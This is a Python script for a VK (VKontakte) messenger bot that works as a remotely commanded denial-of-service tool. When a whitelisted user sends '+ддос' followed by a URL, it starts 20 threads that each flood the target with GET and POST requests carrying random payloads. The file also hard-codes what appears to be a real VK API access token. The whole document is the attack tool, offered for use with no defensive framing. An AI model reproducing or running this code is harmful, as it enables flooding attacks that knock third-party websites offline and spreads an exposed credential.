import requests
import vk_api
import random
from threading import Thread
from vk_api.longpoll import VkLongPoll, VkEventType

token = '14de54ace6d36f1f32064911fddd1e8379e999ae5d102ab9691856983319aa98d26d21d715026a5ea3d7e'
art = [597702807]


def main():
    try:
        session = vk_api.VkApi(token = token)
        vk = session.get_api()
        longpoll = VkLongPoll(session)
        for event in longpoll.listen():
            if event.type == VkEventType.MESSAGE_NEW:    
                if event.text.startswith("+ддос") and event.user_id in art:
                    try:
                        site = event.text[6:]
                        class ddos(Thread):
                            def __init__(self, site):
                                Thread.__init__(self)
                                self.site = site
                            def run(self):
                                for i in range(100):
                                    try:
                                        payload_tuples = str(random.randint(1000000, 99999999999)) + '**' + str(random.randint(1000000, 99999999999))
                                        r = requests.get(self.site)
                                        r1 = requests.post(self.site, data=payload_tuples)
                                        print(r.status_code, r1.status_code)
                                    except Exception as error:
                                        print(error)
                        for i in range(20):
                            ddos(site).start()
                    except Exception as error:
                        print(error)
    except:
        main()
main()
